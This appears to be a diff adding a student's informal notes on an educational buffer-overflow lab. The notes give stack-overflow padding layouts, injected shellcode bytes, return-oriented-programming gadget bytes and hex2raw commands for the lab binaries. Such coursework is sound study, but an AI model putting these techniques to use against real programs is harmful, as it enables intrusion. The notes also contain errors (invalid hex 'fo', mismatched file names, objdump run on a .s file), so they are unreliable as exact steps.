@@ -1,0 +1,86 @@
+phase 1
+gdb ctarget
+run disas test
+move rsp to rdi b/c gets function needs an argument and there is only one argument that sits at rdi
+as long as you enter 55 characters everything is fine and looks perfect but what about 56 char of a b c d a b c d 
+little indian and big indian 1101 =13 least sig is on the right most is on the lest if you want to make it big you reverse it so he did that in the return address 
+0x401564 now rsp come back to the bottom of the stack which is the return address that
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+fo 12 40 00 00 00 00 00
+touch2 memmory adress goes here <<<<<<<<< --- 90 percent of phase2 done but you need to do ./hex2raw < phase1.txt > phase1.data
+^^^ this is your input from file 
+and then do this converstion
+./hex2raw <phase1.txt > phase1.data
+the difference between a txt file and a data file 
+
+///////////////////////////////////////////////////////////
+Phase 2
+touch2 
+you must populate rdi
+id the instruction that will move the cookie value by moving the cookie to the rdi
+so 
+movq cookie, %rdi
+retq
+then
+gcc -c something
+
+then
+-d phase2
+put the above byte rep2 in the buffer
+o: 48 c7 c7 1c d7 83 7a
+change return address to point to this particular address we loaded in to rsp after get register address of rsp by info r 
+so 
+55 66 36 b8 moves to the above spot
+
+do the hex dumb raw on the text file
+vi phase2.s
+gcc -c phase2.s
+objdump - d phase2.s
+
+then put the 48 c7 c7  1 c d7 83 7a in the top of
+00 00 00 00 00 00 00 00 <<<<<^^^^ goes here
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+fo 12 40 00 00 00 00 00
+touch2 memmory adress goes here <<<<<<<<< --- 90 percent of phase2 done but you need do ./hex2raw < phase1.txt > phase1.data
+
+
+//////////////////////////////////////////////////////////
+phase 4 
+return orented prg attack 
+use rtarget not c target
+gadgets are already existing in your code which give you hints about what you want to do 
+This phase is the same as phase 2 but without the input 
+mov oxfd %rdi
+movq/mov rax,rdi
+c3 ret
+90
+90 90 no op its a dummy instruction it does nothing so its okay to have 
+48 89 c7 
+90 90 90 
+c3 
+no code injection allowed in r target 
+get the address and have it point at 48 by moving it two bytes so if you had 
+8d 87 48 89 c7 c3 it will start at 
+48
+do pop rax it means a code 58 
+oio rax 
+ret
+58 c3 
+or 58 90 90 90 c3
+control f search for 58
+need to do plus two again so 
+
+phase 5 
+something similar to phase 4 but is similar to phase 3 
+
